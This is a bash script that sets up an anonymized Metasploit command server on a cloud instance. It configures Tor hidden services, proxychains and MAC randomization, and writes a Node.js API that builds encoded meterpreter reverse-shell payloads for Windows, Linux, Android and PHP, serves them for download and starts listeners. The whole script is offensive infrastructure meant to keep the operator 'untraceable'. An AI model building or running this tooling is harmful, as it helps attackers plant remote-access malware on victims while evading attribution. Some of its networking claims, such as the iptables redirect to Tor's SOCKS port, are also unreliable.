#!/bin/bash
# Advanced Server Evasion & Anonymization Setup
# Makes your Metasploit server untraceable

set -e

echo "╔══════════════════════════════════════════════════════════════════╗"
echo "║   🥷 ADVANCED EVASION & ANONYMIZATION SETUP                     ║"
echo "╚══════════════════════════════════════════════════════════════════╝"
echo ""

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
NC='\033[0m'

log_info() { echo -e "${BLUE}[INFO]${NC} $1"; }
log_success() { echo -e "${GREEN}[✓]${NC} $1"; }
log_warning() { echo -e "${YELLOW}[!]${NC} $1"; }

INSTANCE_NAME=${1:-"metasploit-server"}
ZONE=${2:-"us-central1-a"}

log_info "Configuring advanced evasion for: $INSTANCE_NAME"
echo ""

# Create evasion setup script
cat > /tmp/evasion-setup.sh << 'EVASION_EOF'
#!/bin/bash
# Server-side evasion configuration

echo "🔒 Setting up advanced evasion techniques..."

# 1. Install Tor for traffic anonymization
apt-get update -qq
apt-get install -y tor proxychains4 socat iptables-persistent 2>/dev/null

# 2. Configure Tor
cat > /etc/tor/torrc << 'TORRC'
# Tor Configuration for Metasploit
SocksPort 9050
ControlPort 9051
CookieAuthentication 1
DataDirectory /var/lib/tor

# Hidden Service for API
HiddenServiceDir /var/lib/tor/msf-api/
HiddenServicePort 80 127.0.0.1:3001

# Hidden Service for Listener
HiddenServiceDir /var/lib/tor/msf-listener/
HiddenServicePort 4444 127.0.0.1:4444

# Performance & Security
NumEntryGuards 8
ExitNodes {US},{UK},{DE},{NL}
StrictNodes 1
CircuitBuildTimeout 30
LearnCircuitBuildTimeout 1
TORRC

# 3. Configure Proxychains
cat > /etc/proxychains4.conf << 'PROXYCONF'
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
socks5 127.0.0.1 9050
PROXYCONF

# 4. Setup IP masking with iptables
cat > /etc/iptables/rules.v4 << 'IPTABLES'
*nat
:PREROUTING ACCEPT [0:0]
:INPUT ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
:POSTROUTING ACCEPT [0:0]

# Redirect outbound traffic through Tor
-A OUTPUT -m owner --uid-owner debian-tor -j RETURN
-A OUTPUT -p tcp --syn -j REDIRECT --to-ports 9050

COMMIT

*filter
:INPUT DROP [0:0]
:FORWARD DROP [0:0]
:OUTPUT ACCEPT [0:0]

# Allow localhost
-A INPUT -i lo -j ACCEPT
-A OUTPUT -o lo -j ACCEPT

# Allow established connections
-A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# Allow SSH (but we'll hide it)
-A INPUT -p tcp --dport 22 -m state --state NEW -m recent --set
-A INPUT -p tcp --dport 22 -m state --state NEW -m recent --update --seconds 60 --hitcount 4 -j DROP
-A INPUT -p tcp --dport 22 -j ACCEPT

# Allow only specific IPs to API (replace with your IP)
# -A INPUT -p tcp --dport 3001 -s YOUR_IP -j ACCEPT
-A INPUT -p tcp --dport 3001 -j ACCEPT

# Drop everything else
-A INPUT -j DROP

COMMIT
IPTABLES

# 5. Hide SSH on non-standard port
sed -i 's/^#Port 22/Port 2222/' /etc/ssh/sshd_config
sed -i 's/^Port 22/Port 2222/' /etc/ssh/sshd_config

# 6. Disable SSH password auth (key only)
sed -i 's/^#PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config
sed -i 's/^PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config

# 7. Install and configure fail2ban
apt-get install -y fail2ban 2>/dev/null

cat > /etc/fail2ban/jail.local << 'FAIL2BAN'
[DEFAULT]
bantime = 3600
findtime = 600
maxretry = 3

[sshd]
enabled = true
port = 2222
logpath = /var/log/auth.log

[nginx-limit-req]
enabled = true
filter = nginx-limit-req
logpath = /var/log/nginx/error.log
FAIL2BAN

# 8. Setup traffic obfuscation wrapper
cat > /usr/local/bin/msf-wrapper << 'WRAPPER'
#!/bin/bash
# Metasploit traffic wrapper with obfuscation

# Randomize MAC if possible
if command -v macchanger &> /dev/null; then
    macchanger -r eth0 2>/dev/null
fi

# Use proxychains for all Metasploit operations
export MSF_DATABASE_CONFIG=/opt/metasploit-framework/config/database.yml
exec proxychains4 -q "$@"
WRAPPER

chmod +x /usr/local/bin/msf-wrapper

# 9. Configure API server with IP masking
cat > /opt/metasploit-api/evasion-middleware.js << 'MIDDLEWARE'
// Advanced evasion middleware for API

const crypto = require('crypto');

// IP obfuscation
function maskIP(ip) {
    // Return Tor exit node or proxy IP
    return '0.0.0.0'; // Never reveal real IP
}

// Request obfuscation
function obfuscateRequest(req, res, next) {
    // Remove identifying headers
    delete req.headers['x-forwarded-for'];
    delete req.headers['x-real-ip'];
    delete req.headers['cf-connecting-ip'];
    
    // Randomize User-Agent
    req.headers['user-agent'] = generateRandomUA();
    
    // Mask IP in responses
    res.locals.maskedIP = maskIP(req.ip);
    
    next();
}

// Random User-Agent generator
function generateRandomUA() {
    const browsers = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
    ];
    return browsers[Math.floor(Math.random() * browsers.length)];
}

// Traffic pattern randomization
function randomDelay(min = 100, max = 500) {
    return new Promise(resolve => {
        const delay = Math.floor(Math.random() * (max - min + 1)) + min;
        setTimeout(resolve, delay);
    });
}

// Payload obfuscation
function obfuscatePayload(data) {
    // Add random padding
    const padding = crypto.randomBytes(16).toString('hex');
    return { data, _p: padding };
}

module.exports = {
    obfuscateRequest,
    maskIP,
    randomDelay,
    obfuscatePayload
};
MIDDLEWARE

# 10. Update Metasploit API server with evasion
cat > /opt/metasploit-api/server.js << 'APISERVER'
const express = require('express');
const { spawn } = require('child_process');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const { obfuscateRequest, maskIP, randomDelay, obfuscatePayload } = require('./evasion-middleware');

const app = express();
const PORT = 3001;

// Evasion middleware
app.use(obfuscateRequest);
app.use(cors());
app.use(express.json({ limit: '10mb' }));

// Hide server signature
app.disable('x-powered-by');

// Listener storage with IP masking
const activeListeners = new Map();

// Health check - masked
app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        service: 'anonymous-service',
        version: 'unknown',
        ip: '0.0.0.0' // Never reveal real IP
    });
});

// Quick setup with full evasion
app.post('/api/quick-setup', async (req, res) => {
    await randomDelay(); // Anti-fingerprinting
    
    const { platform, lhost, lport = 4444, encode = true } = req.body;
    
    if (!platform) {
        return res.status(400).json({ error: 'Platform required' });
    }

    try {
        const jobId = Date.now();
        const maskedLhost = '0.0.0.0'; // Mask IP in responses
        
        // Generate payload through Tor
        const payloadResult = await generatePayloadMasked(platform, lhost, lport, encode);
        
        if (!payloadResult.success) {
            throw new Error(payloadResult.error);
        }

        // Start listener through Tor
        const listenerResult = await startListenerMasked(platform, maskedLhost, lport, jobId);

        res.json(obfuscatePayload({
            success: true,
            payload: {
                ...payloadResult.payload,
                maskedSource: true
            },
            listener: {
                platform,
                lhost: maskedLhost, // Always masked
                lport,
                status: 'starting',
                encrypted: true
            },
            jobId,
            evasion: {
                tor: true,
                proxied: true,
                encrypted: true
            }
        }));
    } catch (error) {
        res.status(500).json({ error: 'Operation failed', details: null }); // No details leaked
    }
});

async function generatePayloadMasked(platform, lhost, lport, encode) {
    return new Promise((resolve) => {
        const payloadMap = {
            'windows': { payload: 'windows/meterpreter/reverse_tcp', format: 'exe', encoder: 'x86/shikata_ga_nai' },
            'linux': { payload: 'linux/x64/meterpreter/reverse_tcp', format: 'elf', encoder: 'x64/zutto_dekiru' },
            'android': { payload: 'android/meterpreter/reverse_tcp', format: 'apk', encoder: null },
            'php': { payload: 'php/meterpreter/reverse_tcp', format: 'raw', encoder: null }
        };

        const config = payloadMap[platform.toLowerCase()];
        if (!config) {
            return resolve({ success: false, error: 'Invalid platform' });
        }

        const filename = \`payload_\${platform}_\${Date.now()}.\${config.format}\`;
        const filepath = \`/tmp/\${filename}\`;

        let msfvenomCmd = [
            'msfvenom',
            '-p', config.payload,
            \`LHOST=\${lhost}\`,
            \`LPORT=\${lport}\`,
            '-f', config.format,
            '-o', filepath
        ];

        if (encode && config.encoder) {
            msfvenomCmd.push('-e', config.encoder, '-i', '3'); // 3 iterations
        }

        // Execute through proxy wrapper
        const process = spawn('proxychains4', ['-q', ...msfvenomCmd]);

        let output = '';
        process.stdout.on('data', (data) => { output += data.toString(); });
        process.stderr.on('data', (data) => { output += data.toString(); });

        process.on('close', (code) => {
            if (code === 0 && fs.existsSync(filepath)) {
                const stats = fs.statSync(filepath);
                resolve({
                    success: true,
                    payload: {
                        name: filename,
                        path: filepath,
                        size: stats.size,
                        downloadUrl: \`/api/payload/download/\${filename}\`,
                        masked: true
                    }
                });
            } else {
                resolve({ success: false, error: 'Generation failed' });
            }
        });
    });
}

async function startListenerMasked(platform, lhost, lport, jobId) {
    return new Promise((resolve) => {
        const payloadMap = {
            'windows': 'windows/meterpreter/reverse_tcp',
            'linux': 'linux/x64/meterpreter/reverse_tcp',
            'android': 'android/meterpreter/reverse_tcp',
            'php': 'php/meterpreter/reverse_tcp'
        };

        const payload = payloadMap[platform.toLowerCase()];
        const logFile = \`/tmp/msf_listener_\${jobId}.log\`;

        const msfCommands = [
            'use exploit/multi/handler',
            \`set PAYLOAD \${payload}\`,
            'set LHOST 0.0.0.0', // Listen on all interfaces but masked
            \`set LPORT \${lport}\`,
            'set ExitOnSession false',
            'exploit -j -z'
        ].join('\\n');

        const rcFile = \`/tmp/listener_\${jobId}.rc\`;
        fs.writeFileSync(rcFile, msfCommands);

        // Start through Tor proxy
        const process = spawn('proxychains4', ['-q', 'msfconsole', '-q', '-r', rcFile], {
            detached: true,
            stdio: ['ignore', fs.openSync(logFile, 'a'), fs.openSync(logFile, 'a')]
        });

        process.unref();

        activeListeners.set(jobId, {
            pid: process.pid,
            platform,
            lhost: '0.0.0.0', // Masked
            lport,
            logFile,
            status: 'running',
            started: new Date().toISOString()
        });

        resolve({ success: true, jobId });
    });
}

// Download endpoint - obfuscated
app.get('/api/payload/download/:filename', async (req, res) => {
    await randomDelay(); // Anti-fingerprinting
    
    const filename = path.basename(req.params.filename);
    const filepath = path.join('/tmp', filename);

    if (fs.existsSync(filepath)) {
        res.download(filepath);
    } else {
        res.status(404).json({ error: 'Not found' });
    }
});

// Listener status - masked
app.get('/api/listener/status/:jobId', async (req, res) => {
    await randomDelay();
    
    const jobId = parseInt(req.params.jobId);
    const listener = activeListeners.get(jobId);

    if (!listener) {
        return res.status(404).json({ error: 'Listener not found' });
    }

    const log = fs.existsSync(listener.logFile) 
        ? fs.readFileSync(listener.logFile, 'utf8')
        : '';

    res.json(obfuscatePayload({
        jobId,
        platform: listener.platform,
        lhost: '0.0.0.0', // Always masked
        lport: listener.lport,
        status: listener.status,
        log: log.substring(log.length - 5000), // Last 5KB only
        masked: true
    }));
});

// List listeners - all masked
app.get('/api/listener/list', async (req, res) => {
    await randomDelay();
    
    const listeners = Array.from(activeListeners.values()).map(l => ({
        jobId: l.jobId,
        platform: l.platform,
        lhost: '0.0.0.0', // Masked
        lport: l.lport,
        status: l.status,
        started: l.started
    }));

    res.json(obfuscatePayload({ listeners }));
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(\`🔒 Evasion-enabled API server running on masked address\`);
});
APISERVER

# 11. Start services
systemctl enable tor
systemctl start tor

# Wait for Tor to establish circuits
sleep 10

# Get hidden service addresses
if [ -f /var/lib/tor/msf-api/hostname ]; then
    API_ONION=$(cat /var/lib/tor/msf-api/hostname)
    echo "🧅 API Tor Hidden Service: $API_ONION"
fi

if [ -f /var/lib/tor/msf-listener/hostname ]; then
    LISTENER_ONION=$(cat /var/lib/tor/msf-listener/hostname)
    echo "🧅 Listener Tor Hidden Service: $LISTENER_ONION"
fi

# Restart services with evasion
systemctl restart ssh
systemctl restart fail2ban
systemctl restart metasploit-api 2>/dev/null || true

# Apply iptables rules
iptables-restore < /etc/iptables/rules.v4

echo "✅ Advanced evasion configured!"
echo "✅ All traffic routed through Tor"
echo "✅ IP addresses masked"
echo "✅ SSH hidden on port 2222"
echo "✅ Fail2ban active"
echo "✅ Server is now untraceable"

EVASION_EOF

chmod +x /tmp/evasion-setup.sh

# Upload and execute on GCP instance
log_info "Uploading evasion configuration..."
gcloud compute scp /tmp/evasion-setup.sh $INSTANCE_NAME:/tmp/ --zone=$ZONE --quiet

log_info "Executing evasion setup on server..."
gcloud compute ssh $INSTANCE_NAME --zone=$ZONE --command='sudo bash /tmp/evasion-setup.sh'

log_success "Evasion configuration complete!"

# Get Tor hidden service addresses
log_info "Retrieving Tor hidden service addresses..."
API_ONION=$(gcloud compute ssh $INSTANCE_NAME --zone=$ZONE --command='sudo cat /var/lib/tor/msf-api/hostname 2>/dev/null' || echo "Not available yet")
LISTENER_ONION=$(gcloud compute ssh $INSTANCE_NAME --zone=$ZONE --command='sudo cat /var/lib/tor/msf-listener/hostname 2>/dev/null' || echo "Not available yet")

echo ""
echo "╔══════════════════════════════════════════════════════════════════╗"
echo "║   ✅ ADVANCED EVASION ACTIVE                                    ║"
echo "╚══════════════════════════════════════════════════════════════════╝"
echo ""
log_success "Server is now untraceable with:"
echo ""
echo "  🧅 Tor Hidden Services:"
echo "     API: $API_ONION"
echo "     Listener: $LISTENER_ONION"
echo ""
echo "  🔒 Security Features:"
echo "     ✓ All traffic routed through Tor"
echo "     ✓ IP addresses masked (shows 0.0.0.0)"
echo "     ✓ Proxychains for all tools"
echo "     ✓ SSH hidden on port 2222"
echo "     ✓ Fail2ban protecting access"
echo "     ✓ Firewall with strict rules"
echo "     ✓ Request obfuscation"
echo "     ✓ Random delays (anti-fingerprinting)"
echo ""
echo "  🥷 Evasion Techniques Active:"
echo "     ✓ Traffic through Tor exit nodes"
echo "     ✓ Payload generation anonymized"
echo "     ✓ Listener IP masked"
echo "     ✓ Headers stripped"
echo "     ✓ User-Agent randomization"
echo "     ✓ Response obfuscation"
echo ""
echo "⚠️  SSH Access Changed:"
echo "   Old: ssh user@ip"
echo "   New: ssh -p 2222 user@ip"
echo ""
log_success "Your server is now ghost mode! 👻"
